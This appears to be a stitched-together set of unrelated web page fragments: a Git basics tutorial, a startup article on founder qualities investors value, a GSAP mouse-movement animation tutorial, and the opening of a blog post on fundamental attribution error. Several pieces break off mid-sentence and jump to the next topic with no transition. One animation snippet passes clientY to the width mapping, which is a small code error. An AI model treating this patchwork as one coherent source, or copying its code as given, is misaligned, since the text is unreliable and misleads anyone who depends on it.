which brings up the manual, or for a refresher <code>git &lt;command&gt; -h</code> or <code>git &lt;command&gt; --help</code> (<code>--help</code> and <code>-h</code> are equivalent).</p><h2 id="setting-up-git"><a href="#setting-up-git" aria-label="setting up git permalink"></a>Setting up Git</h2><h3 id="installing-git"><a href="#installing-git" aria-label="installing git permalink"></a>Installing Git</h3><p><strong>Windows</strong>: Head to <a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a></p><p><strong>MacOS</strong>: Git comes as part of XCode Command Line Tools, so install that. To check if you’ve installed Git already open a Terminal window and type <code>git --version</code> to check which version you have.</p><p><strong>Linux</strong>: Run <code>sudo apt install git-all</code> (Debian-based) in the terminal or <code>sudo dnf install git-all</code> (RPM-based).</p><h3 id="set-up-configuration-file"><a href="#set-up-configuration-file" aria-label="set up configuration file permalink"></a>Set up Configuration File</h3><p>The first thing to do having installed Git is to set up your user name and email address, since these are used to identify you and stored in all snapshots you make. This is stored in a <strong>configuration file</strong> where you store all your preferences.</p><p>You can either edit this <code>.gitconfig</code> file directly using a text editor or <code>git config --global --edit</code> or instead alter specific fields with <code>git config --global &lt;field&gt; &lt;value&gt;</code> - we’re interested in the fields <code>user.name</code> and <code>user.email</code>.</p><p>We can also configure the text editor we use for commits using the field <code>core.editor</code> - initially this is set to the system default editor (e.g vi for Linux/Mac). <code>commit.template &lt;template_file&gt;</code> lets you specify a template that comes up whenever you commit.</p><p>There are many other fields, however one particular field I find especially useful is <code>alias</code> which maps commands to abbreviations: <code>alias.&lt;ab&gt; &lt;command&gt;</code>.
e.g. <code>git config --global alias.st "status -s"</code> maps <code>git status -s</code> to <code>git st</code>.</p><p><code>git config --list</code> lists all the fields and values from the config file.</p><h3 id="create-a-git-repository"><a href="#create-a-git-repository" aria-label="create a git repository permalink"></a>Create a Git repository</h3><p>To initialise a .git repository you can use <code>git init</code> or, if you want a copy of an existing repository, you can do <code>git clone &lt;repo_url&gt;</code>.</p><p><img src="https://mukulrathi.co.uk/317c63680d60850c4b4035e791ecd896/setup.svg" alt="Setup Terminal"></p><h2 id="git-commit-history"><a href="#git-commit-history" aria-label="git commit history permalink"></a>Git Commit History</h2><p><img src="https://mukulrathi.co.uk/f66fde04be4a0bf374458ed35fff4e77/commit-history.svg" alt="Git Commit History Diagram"></p><p>Git stores data as a series of lightweight “snapshots” known as <strong>commits</strong> - these store the state of the filesystem at that time as well as a pointer to the previous commit(s). Each commit has a unique <em>checksum</em> - the ID Git uses to refer to it.
To keep track of the history, Git has a <strong>HEAD</strong> pointer that points to the first commit (we follow the pointer chain back to see previous commits).</p><p>So we can refer to a commit either by its checksum, or its relation to HEAD, e.g. <code>HEAD~4</code> refers to the commit 4 commits before the HEAD commit.</p><h2 id="the-git-file-system"><a href="#the-git-file-system" aria-label="the git file system permalink"></a>The Git File System</h2><p><img src="https://mukulrathi.co.uk/4b6c8479c4391d055b65a8d2a2598187/file-system.svg" alt="Git File System  Diagram"></p><p>Git keeps track of files in 3 main sections:</p><ul><li>Working Directory (this is your computer’s filesystem)</li><li>Staging Area (this stores the contents of your next commit)</li><li>HEAD (the most recent commit in the .git repository)</li></ul><p>All of the main file commands boil down to understanding how Git maintains these three sections. A common misconception is that the staging area only stores changes - a better way to think of these is as <strong>3 separate file systems</strong>, each with their own copies of the files.</p><h3 id="view-changes-in-the-git-file-systems"><a href="#view-changes-in-the-git-file-systems" aria-label="view changes in the git file systems permalink"></a>View changes in the Git File Systems</h3><p><code>git status</code> displays any files that differ between the 3 sections. Files have 4 states:</p><ul><li><em>Untracked</em> - in Working Dir but no version stored in HEAD or Staging Area (Git doesn’t know about file)</li><li><em>Modified</em> - newer version in Working Dir compared to Staging Area and HEAD. (changes not in next commit)</li><li><em>Staged</em> - newer version in Staging Area and Working Dir compared to HEAD. (ready to be committed)</li><li><em>Unmodified</em> - same version in all 3 sections (i.e. most recent commit has latest version)</li></ul><p>Note: a file can be both modified and staged, if the version in the working directory is newer than that in the staging area, which in turn is newer than the one in the HEAD commit.</p><p>We can use the <code>-s</code> option for <code>git status</code> to get a cleaner (one line per file) output. This displays <strong>??</strong> if a file is not tracked, <strong>red</strong> if modified and <strong>green</strong> if staged.</p><p>To view the actual changes and not just the files that have changed, you can use:</p><ul><li><code>git diff</code> - see the unstaged changes i.e. compare working directory with staging area.</li><li><code>git diff --staged</code> - see the staged changes i.e. compare staging area with HEAD.</li></ul><p>Adding the <code>&lt;file/dir&gt;</code> argument restricts the diff to that those files. e.g. <code>git diff src/</code></p><h3 id="update-the-git-file-systems"><a href="#update-the-git-file-systems" aria-label="update the git file systems permalink"></a>Update the Git File Systems</h3><p><code>git add &lt;file/directory&gt;</code> updates the staging area with the version of the file/directory in the working directory.</p><p><code>git commit</code> updates HEAD with a new commit that snapshots the files in the staging area.</p><p><code>git reset &lt;commit&gt;</code> has three potential steps:</p><ol><li>Point HEAD to <code>&lt;commit&gt;</code> (e.g. if rolling back a commit,staging area and working dir will now have newer version of files than HEAD). Also points branch’s HEAD to that commit. (see Branching section)</li><li>Update Staging Area with contents of <code>&lt;commit&gt;</code>. (this has the effect of unstaging file changes - only Working dir. has newest version)</li><li>Update Working Dir with contents of Staging Area (has effect of overwriting and destroying changes to data - <strong>dangerous - take care</strong>)</li></ol><p>By default, <code>git reset</code> only runs Step 1 + 2 however, the options <code>--soft</code> (only run Step 1) and <code>--hard</code> (run Step 1, 2, 3) modify its behaviour.</p><p>If we pass a file path, <code>git reset &lt;commit&gt; &lt;file/dir&gt;</code> it limits effect of <code>reset</code> to files in that file path e.g. <code>git reset --soft HEAD~1 src/</code>.</p><p><code>git checkout HEAD &lt;file&gt;</code> also has the same effect as <code>git reset --hard HEAD &lt;file&gt;</code> - it overwrites the version of the file in the staging area and working directory with the version at HEAD (effectively undoing your changes since the last commit).</p><p><code>git checkout &lt;file&gt;</code> on the other hand (note no <code>HEAD</code>) overwrites the version of the file in the working directory with the version in the staging area (effectively undoing your changes since the last staged version).</p><p>Finally, <code>git rm &lt;file&gt;</code> untracks the file and deletes it from working directory, the option <code>--cached</code> will untrack a file but not delete it from the working directory.</p><p><img src="https://mukulrathi.co.uk/3a5894bb13482084888f9dbffc12737c/manipulate-files.svg" alt="Git status demonstration"></p><h3 id="ignoring-files"><a href="#ignoring-files" aria-label="ignoring files permalink"></a>Ignoring files</h3><p>Often we don’t want Git to track all of our files in our repository. This might include:</p><ul><li>sensitive files (e.g. passwords.txt)</li><li>huge binary files</li><li>build files that get generated every time you recompile your source code.</li><li>OS/IDE specific files, e.g. <code>.DS_Store</code> for MacOS or <code>.iml</code>for IntelliJ IDE - you want your repo to be as system agnostic as possible.</li></ul><p>We can specify <strong>glob patterns</strong> (think simplified regular expressions) to <strong>match</strong> files that we want to ignore in our <code>.gitignore</code> file.</p><ul><li><code>/___</code> avoids recursivity - only matches it to current directory</li><li><code>__/</code> matches all files in that directory</li><li><code>*___</code> matches all files with that ending</li><li><code>!</code> negates a pattern - i.e. don’t match this</li><li><code>[__]</code> matches a character to any of the characters in the square brackets.</li><li><code>?</code> matches any character</li><li><code>/**/</code> matches nested directories e.g. <code>a/**/d</code> matches <code>a/d</code> <code>a/b/d</code> <code>a/b/c/d</code> etc.</li></ul><p><a href="https://github.com/github/gitignore">Examples of .gitignore files</a></p><p>You can even use <strong>glob patterns</strong> when using <code>&lt;file/dir&gt;</code> in the other Git commands e.g. <code>git add src/*.css</code> would add all <code>.css</code> files in the <code>src</code> folder.</p><h2 id="commits"><a href="#commits" aria-label="commits permalink"></a>Commits</h2><p>Since commits are the backbone of your version history, it is worth going into them in more depth.</p><p><code>git commit</code> opens up your text editor for you to write a commit message in.

<article>
<p><span>When building your startup you can have a great idea and the perfect market conditions and still come up short. For both your startup and investors, execution is key.</span></p>
<p><span>Just look at this slide I found from Alexander Jarvis on Quora:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*4ssSy22XC1crcL3k" alt="Mark Suster on what startup investors look for in entrepreneurs: 70% of my investment decision of an early-stage company is the team" width="720" height="432" data-image-id="0*4ssSy22XC1crcL3k" data-width="1085" data-height="651"></figure>
<p><span>You and your startup team, especially at a management level, are a huge factor as to whether you secure investment or if your pitch ends up in an investor’s trash can.&nbsp;</span></p>
<p><span>And the first person investors look at as they decide whether or not you are deserving of their time and money is you, the founder.</span></p>
<h2><span>What Startup Investors Look For In Entrepreneurs and The Red Flags They Avoid&nbsp;</span></h2>
<p><span>Investors, like most educated gamblers, bet on the jockey – not the horse. Making you the most important asset for a successful fundraising round – especially if you have a proven track record. </span><a href="https://medium.com/startupsoft/why-vcs-almost-blindly-invest-in-founders-with-previous-exits-23824334a260" target="_blank" rel="noopener noreferrer"><span>Studies show</span></a><span> that:</span></p>
<h3><em><strong><span>“Successful serial entrepreneurs are more likely to replicate the success of their past companies.” and “Nearly 80% of [startup] unicorns had at least one co-founder who had previously founded a company of some sort.”&nbsp;</span></strong></em></h3>
<p><span>However, regardless of your previous success investors need to get to know you before they consider investing. They need to trust that you can execute your milestones and that you will provide a valuable ROI. To earn their trust and ultimately win them over you need these essential qualities:&nbsp;</span></p>
<ul>
<li><span>Character</span></li>
<li><span>Confidence</span></li>
<li><span>Coachability&nbsp;</span></li>
</ul>
<h3><b>Character</b></h3>
<p><span>Renowned leadership guru </span><a href="https://www.linkedin.com/in/simonsinek/" target="_blank" rel="noopener noreferrer"><span>Simon Sinek</span></a><span> states that “People don’t buy </span><b>what you do</b><span>; they buy </span><b>why you do it.</b><span>”</span></p>
<p><iframe title="Start with why -- how great leaders inspire action | Simon Sinek | TEDxPugetSound" width="500" height="375" src="https://www.youtube.com/embed/u4ZoJKF_VuA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>

<p><span>If an investor doesn’t know </span><b>why</b><span> you are creating your startup what incentive do they have to invest in you; as opposed to the thousands of other founders out there. If they can’t be sure their money is in the hands of an intelligent, capable, trustworthy founder they are unlikely to commit to a deal.</span></p>
<p><span>Moreover, they aren’t just planning to invest capital in your business but also their valuable time. They are looking to create a long-term business relationship with you and share their expertise and network. If they don’t like or trust you they simply won’t do it.</span></p>
<p><span>Your character is a critical factor and potential investors will want to answer the following questions about you:</span></p>
<ul>
<li><span><strong>Competency</strong> – “Can you do this?” Is the question nearly all financial backers will want the answer to. Demonstrating competence is challenging, but can be made easier if you have been part of (or already founded) a successful startup.&nbsp;</span></li>
<li><span><strong>Commitment</strong> – Are you totally invested in your startup? Are you still working for someone else or have you taken the leap?&nbsp; How hard do you work?&nbsp;</span></li>
<li><span><strong>Honesty</strong> – Do you tell the truth? Any lies you tell will inevitably backfire. </span><a href="https://www.hbs.edu/faculty/Pages/profile.aspx?facId=6560" target="_blank" rel="noopener noreferrer"><span>Howard Stevenson</span></a><span> (Professor Emeritus at Harvard Business School) sums it up perfectly: “The first time you hear anything dishonest come out of a founder’s mouth, you should run, not walk”</span></li>
<li><span><strong>Trustworthiness</strong> – More than telling the truth, do you keep your word and deliver on your promises?</span></li>
<li><span><strong>Who you are underneath it all</strong> – Aside from the above are you the kind of person they will be happy to introduce to their professional networks? Will they enjoy working with you over the next three to five years?&nbsp;</span></li>
</ul>
<h3><b>Confidence</b></h3>
<p><span>It may seem obvious but you need to be confident that you, your idea and your team can overcome the inevitable challenges of founding a startup. You will need to get used to hearing no from investors, clients, banks and even family and friends. It’s important to develop a thick skin and generate self-confidence no matter the hurdles that arise.</span></p>
<p><span>However, there is a fine line between confidence and arrogance – and it’s a line you will need to tread carefully. Overconfidence and arrogance will make you look like a “know-it-all” to investors. If they decide that you won’t be open to guidance and new ideas it will be a deal-breaking red flag and they will walk away. The best way to ensure that you’re portraying confidence and not arrogance is to support your claims with facts and figures.&nbsp;</span></p>
<h3><b>Coachability</b></h3>
<p><span>Do you listen well? Can you learn quickly and effectively? These are two factors essential for investors. They want to feel their time (and money) is well spent and that they are investing in a founder who is open to learning and being mentored.&nbsp;</span></p>
<p><span>A good (smart money) investor will want to nurture a mentor-mentee relationship with you. A receptive mind is a vital quality that you will need. </span><a href="https://www.forbes.com/profile/ron-conway/#4900daef67ac" target="_blank" rel="noopener noreferrer"><span>Ron Conway</span></a><span>, an active early-stage investor in Google and Paypal (and Founder of </span><a href="https://www.svangel.com/index" target="_blank" rel="noopener noreferrer"><span>SV Angel</span></a><span>) puts it this way:&nbsp;</span></p>
<h3><strong><span><i>“Coachability enables a willingness to be open and make the necessary and often numerous course corrections and morphing that startups require.”&nbsp;</i></span></strong></h3>
<h3><b>The Red Flags &amp; Dealbreakers for Investors</b></h3>
<p><span>There are seven “deadly sins” that will leave you investor-less and could potentially harm your reputation. Here they are and how you can avoid them:&nbsp;</span></p>
<h4>1. Dishonesty</h4>
<p><span>As I mentioned before lies inevitably backfire. Lying about any aspect of your business (or yourself) will plant a seed of doubt into the minds of any potential investor. They will do the necessary research into you and your company to verify your claims before they open their wallets – so be upfront and honest at all times.&nbsp;</span></p>
<h4>2. Telling Them you Have “No Competition”</h4>
<p><span>Even if your product is the most innovative product the world has ever seen you will either be disrupting an existing market or creating a new market that will quickly fill with investors.&nbsp;</span></p>
<h4>3. Saying you “Only Need 1% of the Market Share”<span>&nbsp;</span></h4>
<p><span>This is a great way to show investors that you don’t understand sales or customer CPA (cost-per-acquisition). Instead of talking in market share talk in customers. Specifically how many you need, how much you will spend to get them and how long it will take for you to get to that number.&nbsp;</span></p>
<h4>4. Failing to Fulfil Your Commitments</h4>
<p><span>When asked about what might kill a potential deal for her clients </span><a href="https://www.linkedin.com/in/marciasnelson/" target="_blank" rel="noopener noreferrer"><span>Marcia Nelson</span></a><span> Managing Director of </span><a href="https://www.alberleen.com/" target="_blank" rel="noopener noreferrer"><span>Alberleen Family Office Solutions</span></a><span> said on aspect is when a “startup’s management takes too long to get us requested information – while it may not kill a deal, it will certainly make us more cautious.” Investors want to know that you take your commitments seriously and that you are prepared to fulfil requests in a timely manner.&nbsp;</span></p>
<h4>5. Being Desperate</h4>
<p><span>Desperation can break a business partnership before it begins and shows investors that you are unconfident.&nbsp;</span></p>
<h4>6. Being Arrogant or Defensive<span>&nbsp;</span></h4>
<p><span>As I mentioned above confidence and arrogance are close neighbours and it’s important not to come off too strong.&nbsp;</span></p>
<h4>7. An Unwillingness to Listen</h4>
<p><span>Own your weaknesses. Investors will be put off if you act like you have all the answers and don’t need any help. You will need guidance and help on your journey and investors already know that. If you admit your faults and actively seek advice you will be left with a much healthier and more productive business relationship.&nbsp;</span></p>
<p><span>As a founder, it is </span><b>your responsibility</b><span> to make as easy as possible for investors to say yes to both you and your startup. You have to put yourself in the best position to form a great partnership that will be a lucrative deal for all parties involved. And the next step in that process is choosing your founding team,</span></p>
<h2><span>Choosing Your Co-Founders&nbsp;</span></h2>
<p><span>The founder who will lead the company isn’t necessarily the inventor. It is someone who believes in the startup’s idea and product. So much so that they are willing to put their future on the line to turn that idea into a successful company.</span></p>
<p><span>You should try and choose professionals that have the skills you lack. Someone who has a skillset to offer in another part of the business. Their skills should complement yours.&nbsp;</span></p>
<p><span>Another important factor is ensuring your values, expectations and business goals are aligned. You and your co-founders will become your startup’s core management team. It’s important to be on the same page when it comes to your startup’s mission, business goals, values and timeline.</span></p>
<p><span>You need to ask yourself if your personalities are compatible. </span><a href="https://techcrunch.com/2017/02/18/co-founder-conflict/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZm9yYmVzLmNvbS9zaXRlcy9reWxld29uZy8yMDE4LzA3LzI2L2hvdy10by1waWNrLXRoZS1yaWdodC1jb2ZvdW5kZXJzLWFuZC13aHktaXQtaW1wcm92ZXMteW91ci1jdXN0b21lci1leHBlcmllbmNlLw&amp;guce_referrer_sig=AQAAAEtIKZoxIkLDJGeNlqJVPCniIv_oDI2VMfIzQ8MoJFst1Y1LpVPlj_dgeGnWBxvuTx9vTEPU8-Lvvf4l34V7ZmlCoi71qW367ATIsBoEnNZ0Pybpbb0jkw9IphJ8mm-GJetR8PtNUn8-Pv5Rvdh2cXfZ_aO-Kk5hLP--l9aOGQXp" target="_blank" rel="noopener noreferrer"><span>Gary Tan</span></a><span>, Managing Partner at Initialized Capital and previously at YCombinator puts it perfectly:</span></p>
<figure><img src="https://cdn-images-1.medium.com/max/720/0*k0NpSqRY3Ufsv_kH" alt="Gary Tan: Co-founder disputes have historically been one of the top reasons startups fail" width="720" height="440" data-image-id="0*k0NpSqRY3Ufsv_kH" data-width="752" data-height="460"></figure>
<p><span>Will you be able to embrace the conflict with this person? Discussing disagreements on a level playing field to improve your business?&nbsp;</span></p>
<p><span>It comes down to one overarching question:</span></p>
<h4><b>Can you work together over a long period of time? </b></h4>
<p><span>After all, what good is it if their hard skills complement yours if you don’t actually like the person you have chosen as your cofounder?&nbsp;</span></p>
<p><span>Investors will take the dynamics of your relationship into account as they assess if your startup will be the right fit for their portfolio. As well as assessing your co-founder on the same essential qualities they judged you on.&nbsp;</span></p>
<p><span>I recommend that you thoroughly and carefully consider a business partner as you would a life partner. Ask yourself, if in the toughest times will that person remember that you are both on the same team and be by your side? More importantly, will they be an asset to your business.&nbsp;</span></p>
<p><span>Serial entrepreneur, </span><a href="https://twitter.com/amiller" target="_blank" rel="noopener noreferrer"><span>Andy Miller’s</span></a><span> formula is simple: </span><b>People</b><span> + </span><b>Execution </b><span>= </span><b>Success</b><span>. Your potential investors are counting on you and your startup management team to execute on your business plan, gain traction and, ultimately, bring in revenue no matter the hurdles.&nbsp;</span></p>
<p><span>Your founding team’s primary responsibility is to plan your journey to market that avoids potential roadblocks. Then, when unexpected roadblocks do inevitably appear, you and your founding team use that plan to navigate them.&nbsp;</span></p>
<p><span>As </span><a href="https://www.linkedin.com/in/seansheppard/" target="_blank" rel="noopener noreferrer"><span>Sean Sheppard</span></a><span> puts it:&nbsp;</span></p>
<h3><strong><span><i>“Most companies and innovations fail, and the reasons have to do with markets and the behaviours of the people who are running them, not the products themselves”.</i></span></strong></h3>
<p><span>You need to be able to trust and count on your co-founders. Choose correctly and you will have a strong foundation on which to move onto the next step: building a startup team.</span></p>

Not mouse movement in particular, but interactivity. Exporting animation as an mp4 is cool and all. But you can't <em>play</em> with it.</p><p>Animating on the web opens up so many cool possibilities!</p><p>If you're the kind of person who learns best by digging into the code, then just go ahead and fork that pen, have fun!</p><hr><p>Still here? 😊 Cool beans, let's go through it together.</p><p>I use <a href="https://greensock.com/">Greensock</a> for all my SVG animation. There are a few reasons for this. Firstly, it gives you more control and is super fun to use. But more importantly, as browsers implement the SVG spec differently, animating can get a bit messy. The team at Greensock put a lot of effort into harmonizing behavior across browsers.</p><p>Under the hood though, Greensock is just a really performant property manipulator. It will manipulate (pretty much) whatever value you want to change. In this case it's updating the values in a matrix transform. Check this out.</p><p><img src="https://www.cassie.codes/images/cursor.gif" alt="gif of matrix transforms updating with dev tools open" loading="lazy"></p><p>Cool right! Greensock is great at this kind of thing, but there's a lot going on in this pen, so let's break it down into chunks and focus on one bit at a time. First up, the mouse interaction. We'll come back to Greensock in a bit!</p><h2 id="heading-mouse-movement-fun!">Mouse movement fun!<a href="#heading-mouse-movement-fun!"><span role="text"> permalink</span></a></h2><p>So, there's another way we can modify values in CSS with Javascript. <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties">CSS custom properties!</a></p><p data-height="500" data-theme-id="dark" data-default-tab="result" data-user="cassie-codes" data-slug-hash="OJMOLML" data-pen-title="Mouse movement demo"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/OJMOLML">Mouse movement demo</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>Let's walk through the process. The goal is to get the x and y position of the cursor as we move our mouse about, and then we can use those values to update some custom properties.</p><p>In the previous gif Greensock is using matrix transforms, which are more performant. But we're going to use <code>transform: translate(x,y)</code> for this as it's a tad more readable, and we can use percentage values.</p><p>First up, we declare some custom properties for the x and y values and then use those custom properties in place of regular property values in our transform.</p><pre><code><span><span>:root</span> <span>{</span></span><br><span>  <span>--mouse-x</span><span>:</span> 0<span>;</span></span><br><span>  <span>--mouse-y</span><span>:</span> 0<span>;</span></span><br><span><span>}</span></span><br><span></span><br><span><span>.pointer</span> <span>{</span></span><br><span>  <span>transform</span><span>:</span> <span>translate</span><span>(</span><span>var</span><span>(</span>--mouse-x<span>)</span><span>,</span> <span>var</span><span>(</span>--mouse-y<span>)</span><span>)</span><span>;</span></span><br><span><span>}</span></span></code></pre><p>Then we need to get our mouse coordinates. We can do this by listening to the mouse movement and getting the mouse's coordinates with <code>clientX</code> and <code>clientY</code></p><p>We'll assign those values to some global variables so that we can access them in another function later.</p><pre><code><span><span>let</span> xPosition<span>;</span></span><br><span><span>let</span> yPosition<span>;</span></span><br><span></span><br><span></span><br><span><span>function</span> <span>updateMouseCoords</span><span>(</span><span>event</span><span>)</span> <span>{</span></span><br><span>  xPosition <span>=</span> event<span>.</span>clientX<span>;</span></span><br><span>  yPosition <span>=</span> event<span>.</span>clientY<span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'mousemove'</span><span>,</span> updateMouseCoords<span>)</span><span>;</span></span></code></pre><p>Now we've got our coordinates, lets use them to update our custom properties and move our pointer around!</p><p>😇 When animating things on the web it's important to pay attention to performance. We can't know for sure how many times a users mouse event will fire as it's implementation specific. If it fires more than 60 times per second (which is the average refresh rate for most browsers) we'll end up with unnecessary computation. So to avoid burning up everyone's laptop fans and melting their CPU we can use <code>requestAnimationFrame</code></p><p>Request animation frame allows us to make smoother, browser optimized animations. If the user changes tabs, the animation will stop and give the CPU a break. You call the function once to start, and then it recusively calls itself.</p><p>⚠️ This is a great way to crash your browser if you get some code wrong!</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  </span><br><span>  <span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>Right now, the x and y position we're getting back from <code>event.clientX</code> and <code>event.clientY</code> are pixel values, this isn't really useful to us. If we plug them straight into our custom properties we could end up transforming our pointer hundreds of pixels off in one direction.</p><p data-height="500" data-theme-id="dark" data-default-tab="result" data-user="cassie-codes" data-slug-hash="5ed677605b34f86eeb488b4b2a9bfe6a" data-pen-title="Mouse movement demo"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/5ed677605b34f86eeb488b4b2a9bfe6a">Mouse movement demo</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>We need to convert those pixel values into percentages of the window height and width.</p><p>Let's define some global variables for the window width and height and work out the percentage values.</p><pre><code><span><span>let</span> windowHeight <span>=</span> window<span>.</span>innerHeight<span>;</span></span><br><span><span>let</span> windowWidth <span>=</span> window<span>.</span>innerWidth<span>;</span></span><br><span></span><br><span><span>function</span> <span>percentage</span><span>(</span><span>partialValue<span>,</span> totalValue</span><span>)</span> <span>{</span></span><br><span>  <span>return</span> <span>(</span><span>100</span> <span>*</span> partialValue<span>)</span> <span>/</span> totalValue<span>;</span></span><br><span><span>}</span></span><br><span></span><br><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  x <span>=</span> <span>percentage</span><span>(</span>xPosition<span>,</span> windowWidth<span>)</span><span>;</span></span><br><span>  y <span>=</span> <span>percentage</span><span>(</span>yPosition<span>,</span> windowHeight<span>)</span><span>;</span></span><br><span></span><br><span>  window<span>.</span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span><span>requestAnimationFrame</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>This will give us a range from 0 -

First we have to include the core library, if you're on codepen, you can go to your pen settings and search for greensock.</p><p><img src="https://www.cassie.codes/images/gsap-include.png" alt="pen settings on codepen" loading="lazy"></p><p>Now we've got the GSAP library in our pen, we can take advantage of <code>gsap.ticker()</code></p><p>The greensock ticker is like the heartbeat of the GSAP engine - under the hood it uses requestAnimationFrame, just like we were using, but if that isn’t supported, the ticker automatically falls back to using a regular setTimeout() loop.</p><p>So rather than calling our function with request animation frame, we would do this...</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  </span><br><span><span>}</span></span><br><span></span><br><span>gsap<span>.</span>ticker<span>.</span><span>add</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>Aside from making structuring animation itself more intuitive, Greensock provides a load of super cool utility functions that make your life easier. Remember all that work we did to get a nice usable range? Chuck that all in the bin. Look what we can do now!</p><pre><code><span></span><br><span><span>let</span> mapWidth<span>;</span></span><br><span><span>let</span> mapHeight<span>;</span></span><br><span><span>function</span> <span>setMaps</span><span>(</span><span>)</span> <span>{</span></span><br><span>  mapWidth <span>=</span> gsap<span>.</span>utils<span>.</span><span>mapRange</span><span>(</span><span>0</span><span>,</span> innerWidth<span>,</span> <span>-</span><span>50</span><span>,</span> <span>50</span><span>)</span><span>;</span></span><br><span>  mapHeight <span>=</span> gsap<span>.</span>utils<span>.</span><span>mapRange</span><span>(</span><span>0</span><span>,</span> innerHeight<span>,</span> <span>-</span><span>50</span><span>,</span> <span>50</span><span>)</span><span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'resize'</span><span>,</span> setMaps<span>)</span><span>;</span></span><br><span><span>setMaps</span><span>(</span><span>)</span><span>;</span></span></code></pre><p>Now we can listen to the mouse movement, feed <code>clientX</code> and <code>clientY</code> into mapWidth, and we'll get back a value within the range we've set!</p><pre><code><span><span>let</span> xPosition<span>;</span></span><br><span><span>let</span> yPosition<span>;</span></span><br><span></span><br><span></span><br><span><span>function</span> <span>updateMouseCoords</span><span>(</span><span>event</span><span>)</span> <span>{</span></span><br><span>  xPosition <span>=</span> <span>mapWidth</span><span>(</span>event<span>.</span>clientX<span>)</span><span>;</span></span><br><span>  yPosition <span>=</span> <span>mapWidth</span><span>(</span>event<span>.</span>clientY<span>)</span><span>;</span></span><br><span><span>}</span></span><br><span>window<span>.</span><span>addEventListener</span><span>(</span><span>'mousemove'</span><span>,</span> updateMouseCoords<span>)</span><span>;</span></span></code></pre><p>So tidy and concise!</p><p>Instead of updating CSS custom properties, we're going to use a Greensock tween. A Tween is what does all the animation work, as I said at the start, it's like a high-performance property manipulator.</p><p>A tween takes in two parameters</p><p>The targets, which are the object(s) whose properties you want to animate. Greensock uses <code>document.querySelectorAll()</code> internally so we can use any CSS selector we would use in CSS, or a direct reference to an element.</p><p>And the vars, an object containing all the properties/values you want to animate, along with any special properties like delay, ease, or duration.</p><pre><code><span><span>function</span> <span>movePointer</span><span>(</span><span>)</span> <span>{</span></span><br><span>  gsap<span>.</span><span>to</span><span>(</span>pointer<span>,</span> <span>{</span></span><br><span>    xPercent<span>:</span> xPosition<span>,</span></span><br><span>    yPercent<span>:</span> yPosition<span>,</span></span><br><span>    ease<span>:</span> <span>'none'</span></span><br><span>    </span><br><span>    </span><br><span>  <span>}</span><span>)</span><span>;</span></span><br><span><span>}</span></span><br><span></span><br><span>gsap<span>.</span>ticker<span>.</span><span>add</span><span>(</span>movePointer<span>)</span><span>;</span></span></code></pre><p>I've added a couple more easing equations in here so you can change them out and see what a difference it can make to the movement.</p><p data-height="400" data-theme-id="dark" data-preview="true" data-default-tab="js,result" data-user="cassie-codes" data-slug-hash="rNxYpzO" data-pen-title="Mouse movement demo - GSAP - easing"><span>See the Pen <a href="https://codepen.io/cassie-codes/pen/rNxYpzO">Mouse movement demo - GSAP - easing</a> by Cassie Evans (<a href="https://codepen.io/cassie-codes">@cassie-codes</a>) on <a href="https://codepen.io/">CodePen</a>.</span></p><p>If you want to focus more on performance than easing you can use gsap.quickSetter to update the transforms.

<a href="https://rakhim.org/index.xml">RSS</a></p></nav><hr><article><p>There's this thing called <strong>fundamental attribution error:</strong></p><blockquote><p>In <a href="https://en.wikipedia.org/wiki/Social_psychology">social psychology</a>, <strong>fundamental attribution error</strong> (<strong>FAE</strong>), also known as <strong>correspondence bias</strong> or <strong>attribution effect</strong>, is the tendency for people to under-emphasize situational explanations for an individual's observed behavior while over-emphasizing dispositional and personality-based explanations for their behavior. This effect has been described as “the tendency to believe that what people do reflects who they are”</p></blockquote><p>Basically, when you make a mistake — it's due to some good reason, but when someone else makes a mistake — it's because they are bad people who make mistakes.</p><p>I was thinking about this pattern of observing reality when reading other people's blog posts describing life situations, technical setups, whatever. Let's say I'm reading about some developer's perfect programming environment setup. They share all the steps involved in creating this extremely complex system with automation, lots of inter-connected software, scripts and hardware addons. In the end, they conclude with how happy they are about the setup, how it helped their productivity and everything is peachy.</p><p>Inspired, I try to reproduce a <em>portion</em> of the described system, but quickly face the reality: things aren't connecting as nicely as I expected, bugs and compatibility issues force me to write dirty hacks, and in the end the whole thing is just waiting to break.</p><p>I'm not doing this anymore nowadays. Every time I see a cool setup, be it OS, Terminal, Emacs, Vim or even some iOS automations, I just think how hard it is to maintain all of that and go to my Emacs config looking for something new to disable.</p><p>But for the longest time I seem to have been making a Fundamental Attribution of Ability Error. I was thinking that people's setups are in fact perfect. That there's something wrong with me, that my attempts to build a convoluted architecture fail because I'm a bad programmer. With experience and after talking to a lot of people, I realized how much of a facade many of us create when describing our creations.</p><p>No, your Emacs setup does not have “zero issues”. Sorry, I don't believe you. It has issues and it breaks and you fix it sometimes. No, your Karabiner + Hammerspoon + AppleScripts + KeyboardMaestro setup with two hundred custom keyboard shortcuts is not “maintenance free”. No, your dotfiles repo with Ansible script does not guarantee a one-command-setup on a new 